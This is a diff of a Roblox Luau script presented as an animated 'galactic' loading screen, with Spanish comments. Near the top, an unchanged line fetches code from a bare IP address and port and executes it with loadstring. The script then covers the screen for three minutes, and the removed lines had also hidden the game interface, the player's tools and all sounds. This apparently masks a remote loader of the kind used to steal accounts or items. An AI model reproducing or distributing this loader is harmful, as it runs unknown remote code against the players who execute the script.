@@ -3,79 +3,22 @@ ID = "9616e3d1-e054-47a2-b17e-94fb52bfc5a9";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 
 local player = game.Players.LocalPlayer
-local StarterGui = game:GetService("StarterGui")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 
--- Ocultar interfaz de Roblox
-for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
-    pcall(function()
-        StarterGui:SetCoreGuiEnabled(guiType, false)
-    end)
-end
-UserInputService.MouseIconEnabled = false
-
--- Ocultar herramientas
-local herramientasGuardadas = {}
-if player.Character then
-    for _, tool in ipairs(player.Character:GetChildren()) do
-        if tool:IsA("Tool") then
-            table.insert(herramientasGuardadas, tool)
-            tool.Enabled = false
-            tool.Parent = nil
-        end
-    end
-end
-
--- Ocultar GUIs personalizadas
-local guiContenedores = {
-    player:WaitForChild("PlayerGui"),
-    game:GetService("StarterGui"),
-    player.Character or player.CharacterAdded:Wait()
-}
-for _, contenedor in ipairs(guiContenedores) do
-    for _, gui in ipairs(contenedor:GetDescendants()) do
-        if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
-            gui.Enabled = false
-        elseif gui:IsA("TextButton") or gui:IsA("ImageButton") then
-            gui.Visible = false
-            gui.Active = false
-        end
-    end
-end
-
--- Silenciar todos los sonidos del juego
-for _, s in ipairs(workspace:GetDescendants()) do
-    if s:IsA("Sound") then
-        s.Volume = 0
-        s:Stop()
-    end
-end
-
-task.spawn(function()
-    while player:FindFirstChild("PlayerGui"):FindFirstChild("PantallaDeCarga") do
-        for _, s in ipairs(workspace:GetDescendants()) do
-            if s:IsA("Sound") then
-                s.Volume = 0
-                s:Stop()
-            end
-        end
-        wait(0.5)
-    end
-end)
-
--- Pantalla de carga galáctica
+-- Crear GUI
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 gui.Name = "PantallaDeCarga"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 
+-- Fondo negro
 local fondo = Instance.new("Frame", gui)
 fondo.Size = UDim2.new(1, 0, 1, 0)
 fondo.BackgroundColor3 = Color3.new(0, 0, 0)
 fondo.BorderSizePixel = 0
 fondo.ZIndex = 1
 
+-- Estrellas animadas
 local estrellas = {}
 for i = 1, 100 do
     local estrella = Instance.new("Frame", fondo)
@@ -92,12 +35,14 @@ for i = 1, 100 do
     })
 end
 
+-- Sonido galáctico
 local sonido = Instance.new("Sound", workspace)
 sonido.SoundId = "rbxassetid://1840776993"
 sonido.Volume = 0.5
 sonido.Looped = true
 sonido:Play()
 
+-- Título
 local titulo = Instance.new("TextLabel", gui)
 titulo.Size = UDim2.new(1, 0, 0.2, 0)
 titulo.Position = UDim2.new(0, 0, 0.3, 0)
@@ -107,6 +52,7 @@ titulo.Font = Enum.Font.FredokaOne
 titulo.TextScaled = true
 titulo.ZIndex = 10
 
+-- Tips dinámicos
 local tips = Instance.new("TextLabel", gui)
 tips.Size = UDim2.new(1, 0, 0.05, 0)
 tips.Position = UDim2.new(0, 0, 0.48, 0)
@@ -140,6 +86,7 @@ task.spawn(function()
     end
 end)
 
+-- Barra de carga
 local barraFondo = Instance.new("Frame", gui)
 barraFondo.Size = UDim2.new(0.6, 0, 0.05, 0)
 barraFondo.Position = UDim2.new(0.2, 0, 0.6, 0)
@@ -164,12 +111,14 @@ porcentaje.Font = Enum.Font.GothamBold
 porcentaje.TextScaled = true
 porcentaje.ZIndex = 12
 
+-- Animación de carga
 local tiempoTotal = 180
 local tiempo = 0
 
 RunService.RenderStepped:Connect(function(dt)
     tiempo = math.min(tiempo + dt, tiempoTotal)
     local progreso = tiempo / tiempoTotal
+
     local hue = (tick() * 0.1) % 1
     local color = Color3.fromHSV(hue, 1, 1)
     barra.Size = UDim2.new(progreso, 0, 1, 0)
@@ -189,13 +138,8 @@ RunService.RenderStepped:Connect(function(dt)
     end
 end)
 
--- Restaurar sonidos al finalizar
+-- Cerrar pantalla de carga después del tiempo
 task.delay(tiempoTotal, function()
     sonido:Stop()
     gui:Destroy()
-    for _, s in ipairs(workspace:GetDescendants()) do
-        if s:IsA("Sound") then
-            s.Volume = 1
-        end
-    end
 end)
